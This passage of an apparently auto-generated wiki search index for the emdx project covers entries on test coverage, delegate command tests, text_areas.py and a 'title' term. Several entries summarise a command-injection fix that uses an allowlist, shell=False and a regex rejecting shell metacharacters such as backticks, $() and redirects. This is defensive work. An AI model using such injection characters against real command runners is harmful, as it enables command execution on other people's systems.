substitution: ``</code> <code>`,</code>$()<code>- Redirects:</code>&lt;<code>,</code>&gt;<code>- Newlines:</code> <code>,</code> `</p>"},{"location":"entities/test-coverage/#3-safe-execution","title":"3. Safe Execution","text":"<ul> <li> <p>Uses `sh...</p> </li> <li> <p>#6151 Delegate: Review PR #453 (Ask the KB). Run: gh pr diff 453. Check code [6/7]   Section: Test Coverage</p> <ul> <li>Existing tests: Pass (CI green on Python 3.13)</li> </ul> </li> <li>New test coverage: None added for new features</li> <li>Risk assessment: LOW</li> <li>New features are additive (existing behavior unchanged when new flags not used)</li> <li> <p>Core tag logic uses...</p> </li> <li> <p>#6150 Delegate: Review PR #448 (Contextual Save). Run: gh pr diff 448. Check [2/7]   Section: Issues Found</p> <p>3. Missing test coverage (Major)</p> </li> <li>No tests for <code>contextual_save.py</code> service</li> <li>No tests for <code>check</code> command</li> <li>No tests for <code>--smart</code> flag on save</li> <li> <p>PR body says \"[x] tested\" but no test files added</p> </li> <li> <p>#6148 Delegate: Review PR #449 (Dream Journal). Run: gh pr diff 449. Check c [3/7]   Section: Issues Found</p> </li> <li> <p>#6521 Delegate synthesis [synthesis]   Section: Common Themes</p> <p>...able Output:** Both included output modes optimized for piping to other tools</p> </li> <li> <p>Test Coverage: Both PRs included test suites that weren't merged</p> </li> <li> <p>#6531 Delegate synthesis [synthesis]   Section: Quality Assessment Summary</p> PR Quality Test Coverage Critical Issues #652 \u2b50\u2b50\u2b50\u2b50 Comprehensive (~440 lines) Timeout flag not wired up #651 \u2b50\u2b50\u2b50\u2b50\u2b50 Exis... </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: Recommended Implementation Plan</p> </li> <li>Port <code>tests/test_ask.py</code> from PR #453</li> <li>Update syntax to match current codebase style</li> <li> <p>Add integration tests with DatabaseForTesting fixture</p> </li> <li> <p>#6450 Implement emdx distill command   Section: 3. tests/test_distill.py</p> <p>Test Coverage:</p> </li> <li>SynthesisService: 10 tests covering model init, empty docs, prompts, synthesis</li> <li>DistillCommand: 4 tests covering CLI invocation, error handling</li> <li> <p>SynthesisResult: 1 test for dataclass creation</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: Executive Summary</p> <p>...ning stability. Key areas for improvement: type annotations in migrations, broader test coverage for UI components.</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: DEBT-19: Add missing test coverage for delegate command</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each   Section: 1. Fixed Command Injection in <code>_run_discovery()</code> (CRITICAL)</p> <p>Test Coverage: 16 new tests in <code>TestValidateDiscoveryCommand</code></p> </li> <li> <p>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37]</p> <p>Security Documentation (emdx/database/groups.py)</p> </li> </ul> <p>Added detailed security notes to <code>update_group()</code> explaining: - Field names are filtered through an allowlist - User values use parameterized queries (?) - The pattern is safe despite f-string interpo...</p> <ul> <li>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37] <p>Added <code>_validate_discovery_command()</code> function:</p> </li> <li>Uses <code>shlex.split()</code> to safely parse commands</li> <li>Validates base command against allowlist</li> <li> <p>Restricts git to safe subcommands only</p> </li> <li> <p>Updated <code>_run_discovery()</code>:</p> </li> <li> <p>Now calls valida...</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Executive Summary</p> <p>Comprehensive audit of the emdx project's testing debt. Found significant gaps in test coverage across CLI commands, services, async code, and utilities. Total of 32 critical and 47 high-priority findings identified.</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udd34 Critical Issues</p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]</p> </li> </ul>"},{"location":"entities/test-coverage/#test-coverage_8","title":"Test Coverage","text":"<p>Missing entirely. No <code>test_dream.py</code> file. PR body shows manual testing checklist with 5/6 items checked, but automated tests are absent.</p>"},{"location":"entities/test-coverage/#phase-5-test-coverage-priority-high-30-min","title":"Phase 5: Test Coverage (Priority: HIGH) \u2014 ~30 min","text":""},{"location":"entities/test-coverage/#summary_1","title":"Summary","text":"<p>Added comprehensive test coverage for the <code>emdx/commands/delegate.py</code> module. The test file now contains 59 tests covering all major functionality.</p>"},{"location":"entities/test-coverage/#1-test-coverage-at-0","title":"1. Test Coverage at 0%","text":"<p>Location: All code under <code>emdx/</code> Impact: High risk of regressions, difficult to refactor safely</p>"},{"location":"entities/test-coverage/#emdx-testing-debt-audit","title":"EMDX Testing Debt Audit","text":""},{"location":"entities/test-coverage/#executive-summary","title":"Executive Summary","text":"<p>The codebase has 836 tests across 40 test files. While there is good coverage of core database operations, document handling, and some services, significant gaps exist in: - Async code coverage (onl...</p> <ul> <li> <p>#6183 Delegate: analysis,audit [13/17]   Section: Codebase Metrics</p> <p>...s | 52,480 | | Source Files | 140 | | Test Files | 40 | | Test Functions | 792 | | Test Coverage | 737 collected tests | | Classes | 123 | | Functions | 466 (top-level) | | CLI Commands | 76 (decorated) | | Async Functions | 150 |</p> </li> <li> <p>#6149 Delegate: Review PR #451 (Knowledge Decay). Run: gh pr diff 451. Check [4/7]</p> <p>This is acceptable. ## Code Quality: \u2705 GOOD</p> </li> </ul> <p>Strengths: - Clean separation of concerns (stale.py, touch.py) - Proper Rich console output formatting - Good error handling in edge cases (datetime parsing, empty results) - Batch tag fetching via `ge...</p> <ul> <li>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Executive Summary <p>...ate attention, particularly around algorithmic complexity, exception handling, and test coverage gaps.</p> </li> </ul>"},{"location":"entities/test-coverage/#related-entities","title":"Related Entities","text":"<ul> <li><code>3. safe execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.6)</li> <li><code>test coverage:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.6)</li> <li><code>fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.6)</li> <li><code>emdx ai context</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.6)</li> <li><code>vulnerability details</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.4)</li> <li><code>_run_discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.4)</li> <li><code>1. command allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.4)</li> <li><code>critical command injection vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.0)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=3.9)</li> <li><code>gameplan requirement</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=3.9)</li> </ul>"},{"location":"entities/teststestcommandsdelegatepy/","title":"tests/test_commands_delegate.py","text":"<p>Type: heading | Mentioned in: 15 documents | First seen: 2026-02-14</p>"},{"location":"entities/teststestcommandsdelegatepy/#documents-15","title":"Documents (15)","text":"<ul> <li>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands <p>Modified <code>_run_discovery()</code> to use secure execution:</p> </li> <li>Calls <code>_validate_discovery_command()</code> before execution</li> <li>Uses <code>shell=False</code> with parsed argument list</li> <li> <p>Prevents shell injection via semicolons, pipes, backticks, <code>$()</code>, etc. ### tes...</p> </li> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command   Section: Files Changed</p> <ul> <li><code>emdx/commands/delegate.py</code> - Security fix implementation (+86 lines)</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code> - Security test suite (+142 lines)</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Files Changed</p> <ul> <li><code>emdx/commands/delegate.py</code> - Security fix (+79 lines)</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code> - Security tests (+142 lines)</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: Changes Made</p> <ul> <li><code>emdx/commands/delegate.py</code>: Added <code>SAFE_DISCOVERY_COMMANDS</code> allowlist, <code>DANGEROUS_PATTERNS</code> regex, and <code>_validate_discovery_command()</code> validation function</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code>: Added 32 comprehensive security tests</p> </li> <li> <p>#6265 Delegate: Document #6230 - Security Fix Implementation   Section: Test Coverage</p> </li> <li><code>emdx/commands/delegate.py</code> - Security fix (+86 lines)</li> <li> <p><code>tests/test_commands_delegate.py</code> - Tests (+100 lines)</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> </li> <li><code>emdx/commands/delegate.py</code>: Added validation logic, switched to <code>shell=False</code></li> <li> <p><code>tests/test_commands_delegate.py</code>: Added 20 security tests</p> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Files Changed</p> <ul> <li><code>emdx/commands/delegate.py</code>: Security fix implementation (+170 lines)</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code>: Test coverage (+85 lines)</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Files Modified</p> <ul> <li><code>emdx/commands/delegate.py</code> - Security fix implementation</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code> - 31 new security tests</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> </li> <li><code>emdx/commands/delegate.py</code>: +84 lines (validation + secure execution)</li> <li> <p><code>tests/test_commands_delegate.py</code>: +165 lines (security tests)</p> </li> <li> <p>#6245 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [2/37]   Section: Test Coverage</p> <p>Added 53 security tests in <code>tests/test_commands_delegate.py</code>:</p> </li> <li><code>TestValidateDiscoveryCommand</code>: 32 tests for command validation</li> <li><code>TestShellMetacharacters</code>: 13 tests for regex coverage</li> <li> <p><code>TestSafeDiscoveryCommands</code>: 8 tests for allowlist verification</p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: Files Changed</p> <ul> <li><code>emdx/commands/delegate.py</code> - Added security validation and safe execution</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code> - Added 15 new tests for security validation</p> </li> <li> <p>#6241 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [10/37]   Section: Pull Request</p> <p>Files changed:</p> </li> <li><code>emdx/commands/delegate.py</code> - Security fix</li> <li> <p><code>tests/test_commands_delegate.py</code> - Added 12 new tests</p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Fix Applied</p> </li> <li><code>emdx/commands/delegate.py</code>: Added <code>_validate_discovery_command()</code> and allowlist</li> <li> <p><code>tests/test_commands_delegate.py</code>: Added 19 security tests</p> </li> <li> <p>#6253 Delegate: Fix command injection vulnerability in delegate --each   Section: Changes Made</p> <p>...ion</p> </li> <li> <p>Added proper error handling for invalid syntax, missing commands</p> </li> <li> <p>tests/test_commands_delegate.py - Added 8 new security tests</p> </li> <li>Verify <code>shell=False</code> is used</li> <li>Test <code>shlex.split()</code> argument parsing</li> <li>Test rejection of malformed commands</li> <li> <p>Test error...</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: Files Changed</p> <ol> <li>tests/test_commands_delegate.py</li> </ol> </li> <li>Added <code>TestValidateDiscoveryCommand</code> class with 12 security tests</li> <li>Tests verify allowlist enforcement and rejection of dangerous commands</li> </ul>"},{"location":"entities/teststestcommandsdelegatepy/#files-changed","title":"Files Changed","text":""},{"location":"entities/teststestcommandsdelegatepy/#files-changed_1","title":"Files Changed","text":""},{"location":"entities/teststestcommandsdelegatepy/#files-changed_2","title":"Files Changed","text":""},{"location":"entities/teststestcommandsdelegatepy/#files-changed_3","title":"Files Changed","text":""},{"location":"entities/teststestcommandsdelegatepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>after (secure)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.8)</li> <li><code>fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>curl</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>git ls-files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>bash</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>after (secure):</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>rg -l</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>remaining audit items</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>before (vulnerable)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.6)</li> <li><code>1. command allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/teststestdelegatecommandspy/","title":"tests/test_delegate_commands.py","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2026-02-14</p>"},{"location":"entities/teststestdelegatecommandspy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made </li> <li>Removed <code>subprocess</code> import (no longer needed)</li> <li>Removed <code>_run_discovery</code> from imports</li> <li> <p>Removed the entire <code>TestRunDiscovery</code> class (6 tests covering discovery co...</p> </li> <li> <p>#6849 Delegate: FIX-5: In emdx/commands/delegate.py _run_parallel(), around  [2/4]   Section: Summary</p> <p>...elegate.py:1011<code>** \u2014 Added</code>limit=limit<code>to the synthesis</code>_run_single` call</p> </li> <li> <p><code>tests/test_delegate_commands.py</code> \u2014 Added <code>test_parallel_synthesize_passes_limit</code> test that verifies the last <code>_run_single</code> call (synthesis) receives the <code>limit</code> kwarg</p> </li> <li> <p>#6845 Delegate: Implement FEAT-47: When a delegate is launched with both --t   Section: Summary of changes</p> <p><code>tests/test_delegate_commands.py</code>:</p> </li> <li>Added <code>test_single_task_with_pr_includes_epic_id</code> \u2014 verifies <code>(ARCH-11)</code> appears in the subprocess prompt when the task has epic_key/epic_seq</li> <li> <p>Added `test_sin...</p> </li> <li> <p>#6692 FEAT-12: Add --retry flag to delegate   Section: Changes (3 files, +443/-26 lines):</p> <p><code>tests/test_delegate_commands.py</code> \u2014 16 new tests (89 total pass):</p> </li> <li><code>TestIsRetryableFailure</code> \u2014 9 tests covering retryable/non-retryable patterns</li> <li> <p><code>TestComputeBackoff</code> \u2014 4 tests for backoff math -...</p> </li> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: <code>emdx/services/__init__.py</code> \u2014 9 Symbols Added</p> <p>...ity_view.py<code>| |</code>ExecutionResult<code>|</code>unified_executor<code>|</code>synthesis_service.py<code>,</code>tests/test_delegate_commands.py<code>,</code>tests/test_compact.py<code>| |</code>ExecutionConfig<code>|</code>unified_executor<code>|</code>synthesis_service.py<code>,</code>tests/test_unified_executor.py<code>| |</code>UnifiedExecutor<code>|</code>unified_exec...</p> </li> <li> <p>#6559 Delegate: Document #6543 (Delegate Enhancement Gameplans [2/5]):</p> </li> </ul>"},{"location":"entities/teststestdelegatecommandspy/#teststest_delegate_commandspy_1","title":"tests/test_delegate_commands.py","text":""},{"location":"entities/teststestdelegatecommandspy/#im","title":"Im","text":"<p>Section: Changes Made</p> <ul> <li> <p>#6556 Delegate: --memory N flag implementation   Section: Tests Added</p> <p>In <code>tests/test_delegate_commands.py</code>:</p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode   Section: Task 7: Add tests for <code>--draft</code> flag</p> <p>File: <code>tests/test_delegate_commands.py</code></p> </li> <li> <p>#6320 Delegate: Add comprehensive test coverage for the delegate command (em   Section: Comprehensive Test Coverage for Delegate Command</p> </li> <li> <p>#6425 Delegate: Task #594: Add --draft flag to emdx delegate --pr   Section: Changes Made</p> <ol> <li>tests/test_delegate_commands.py:</li> </ol> </li> <li>Added tests for <code>_make_pr_instruction()</code> with <code>draft=True</code> and <code>draft=False</code></li> <li>Added tests for <code>_run_single()</code> with <code>draft</code> parameter</li> <li>Added tests for...</li> </ul>"},{"location":"entities/teststestdelegatecommandspy/#3-teststest_delegate_commandspy","title":"3. <code>tests/test_delegate_commands.py</code>","text":"<p>Added comprehensive tests: - <code>TestIsRetryableError</code>: 8 tests for error classification - <code>TestRetryBehavior</code>: 5 integration tests for retry logic - <code>TestBackoffTiming</code>: 1 test for backoff calculation</p>"},{"location":"entities/teststestdelegatecommandspy/#summary","title":"Summary","text":"<p>Added 56 comprehensive tests for <code>emdx/commands/delegate.py</code> in <code>tests/test_delegate_commands.py</code>.</p>"},{"location":"entities/teststestdelegatecommandspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>testretrybehavior</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>testisretryableerror</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>testbackofftiming</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>non-retryable</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>backoff formula</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>tests/test_delegate_commands.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>3.</code>tests/test_delegate_commands.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>2.</code>emdx/commands/delegate.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>--retry/-r</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>retryable</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/textareaspy/","title":"text_areas.py","text":"<p>Type: heading | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/textareaspy/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6436 Any/None typing audit [5/5]</p> <p>| Suggested Replacement | |----------|----------|-----------|--------------|----------------------| | <code>switch_to_editing.host</code> | L116 | <code>host: Any</code> | \u2705 Yes | <code>host: TextAreaHost</code> (Protocol) | | <code>switch_to_selecting.host</code> | L156 | <code>host: Any</code> | \u2705 Yes ...</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Cleanup (Lower Impact)</p> <p>...ainer.py<code>event types, registry, dump_widget | 1 file | 30m | | 10 |</code>themes.py<code>,</code>text_areas.py<code>,</code>group_picker.py` quick wins | 3 files | 30m | | 11 | P2 mock specs (SingleResult, Textual widgets) | 2 test files | 30m |</p> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: Acceptable <code>Any</code> (Skip \u2014 Textual Framework Convention)</p> File Line Signature <code>text_areas.py</code> 22 <code>SelectionTextArea.__init__(*args: Any, **kwargs: Any)</code> <code>text_areas.py</code> 85 <code>VimEditTextArea.__init__(*args: Any, **kwargs: Any)</code> `vim_line_number... </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Files by Priority</p> <p>...m | <code>distill.py</code> | 5 | 4 | | Medium | <code>palette_presenter.py</code> | 5 | 5 | | Medium | <code>text_areas.py</code> | 3 | 3 | | Low | <code>tasks.py</code> | 2 | 1 | | Low | <code>executions.py</code> | 1 | 1 | | Keep | <code>retry.py</code> | 8 | 0 | | Keep | <code>output.py</code> | 1 | 0 |</p> </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 3. Text Area Host Protocol \u2014 <code>app_instance: Any</code> (5 occurrences)</p> <p>Locations:</p> </li> <li><code>emdx/ui/text_areas.py:21, 71</code> \u2014 <code>SelectionTextArea.__init__</code>, <code>VimEditTextArea.__init__</code></li> <li><code>emdx/ui/inputs.py:19</code> \u2014 <code>TitleInput.__init__</code></li> <li> <p><code>emdx/ui/vim_editor.py:23</code> \u2014 `VimEditor.__init_...</p> </li> <li> <p>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 1.3 TextArea Default Changes (v0.48.0)</p> <p>Affected Files:</p> </li> <li> <p><code>emdx/ui/text_areas.py</code> - <code>SelectionTextArea</code> and <code>VimEditTextArea</code> classes</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> <p>...: Mode buttons, time formatting, debounce, status, and vim key handling logged</p> </li> <li>text_areas.py: Vim status update fallback after key error logged</li> </ul>"},{"location":"entities/textareaspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>inputs.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>search/search_screen.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>log_browser*.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>command_palette/palette_screen.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>callable[[], none]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/title/","title":"title","text":"<p>Type: tech_term | Mentioned in: 29 documents | First seen: 2026-02-13</p>"},{"location":"entities/title/#documents-29","title":"Documents (29)","text":"<ul> <li> <p>#6759 Wiki Generation Architecture: GitBook + Dendron Research [2/2]   Section: 1. Hierarchical Dot-Notation Naming</p> <p>Frontmatter \u2014 six required fields per note: <code>id</code> (UUID), <code>title</code>, <code>desc</code>, <code>updated</code>, <code>created</code>. Internal fields like <code>parent</code>, <code>children</code> (UUID arrays), <code>fname</code>, <code>links</code> are engine-tracked, not serialized to disk. Title auto-gene...</p> </li> <li> <p>#6756 Dendron VS Code Extension Deep Dive [synthesis]   Section: Core Architecture</p> </li> <li> <p>#6755 Dendron VS Code Extension Deep Dive [2/5]   Section: 3. Auto-Complete Based on Hierarchy (Schemas)</p> <p>Schema suggestions show the <code>title</code> property instead of raw patterns. Namespace schemas allow arbitrary children matching <code>{namespace}.*</code>.</p> </li> <li> <p>#6754 dendron-lookup-research   Section: Fuse.js Configuration</p> <p>For schema lookups, keys are <code>[\"fname\", \"id\"]</code>. For published site search, keys are <code>[\"title\", \"body\"]</code>.</p> </li> <li> <p>#6747 dendron-deep-dive   Section: Could AI Infer Dot-Notation from Unstructured Titles?</p> <p>...Topic extraction: Use LLM to extract the primary topic and subtopics from note titles and content (e.g., \"My Notes on Python Boolean Types\" \u2192 <code>lang.python.data.boolean</code>)</p> </li> <li> <p>Hierarchical clustering: Group notes by semantic similarity, then arrange...</p> </li> <li> <p>#6735 Dendron VS Code Extension Deep Dive [3/5]   Section: 2. Exact YAML Format (All Fields)</p> <p>...id: my_schema          # REQUIRED. Unique identifier; doubles as glob pattern     title: \"Display Name\"  # Shows in lookup bar instead of id/pattern     desc: \"Description\"    # Human-readable, shown during note creation     parent: root           # Req...</p> </li> <li> <p>#6733 Dendron VS Code Extension Deep Dive [1/5]   Section: 3. Note Frontmatter Structure</p> <p>```yaml</p> </li> </ul> <p>id: 4RFQMNA91cRW12VJl_PFd title: Taking Notes desc: Creating notes and understanding hierarchy updated: 1639425310320 created: 1625563944736</p> <pre><code>\n- **#6718** Wiki Generation Architecture Research\n  *Section: 1. Markdown Collection \u2192 Wiki (Static Site Generators)*\n  &gt; ...e.g., API docs from code)\n- **autorefs** \u2014 Automatic cross-page linking by heading title (no need to know file paths)\n- **mkdocs-awesome-autolinks** \u2014 Link to pages/images without full paths; resolves automatically\n\n- **#6710** Delegate: Design a unified dashboard data model. Given that we want to [4/4]\n  *Section: The Core Insight: `ActivityItem` IS the Dashboard Item*\n  &gt; ...tivity/activity_items.py:15`) already provides the right abstraction \u2014 `item_id`, `title`, `timestamp`, `status`, `doc_id`, `cost`, plus virtual properties `item_type`, `type_icon`, `status_icon`, and `get_preview_content()`. Documents and executions are...\n\n- **#6596** Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]\n  *Section: Title Extraction Priority*\n  &gt; 1. YAML frontmatter `title:` field\n2. First H1 heading (`# Title`)\n3. Filename (sans extension)\n\n- **#6593** Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]\n  *Section: MVP Import: Plain Markdown Folders*\n  &gt; ### Title Extraction Priority\n1. YAML frontmatter `title:` field\n2. First H1 heading (`# Title`)\n3. Filename (sans extension)\n\n- **#6502** None Type Analysis [1/7]\n  *Section: emdx/commands/delegate.py*\n  &gt; ..._save_output_fallback(\n    output_file: Path,\n    output_content: str | None,\n    title: str,\n    tags: list[str],\n) -&gt; int | None:\n</code></pre> <p>Verdict: NECESSARY - <code>output_content</code>: Checked with `if not content and output_content and output_content.strip()...</p> <ul> <li> <p>#6499 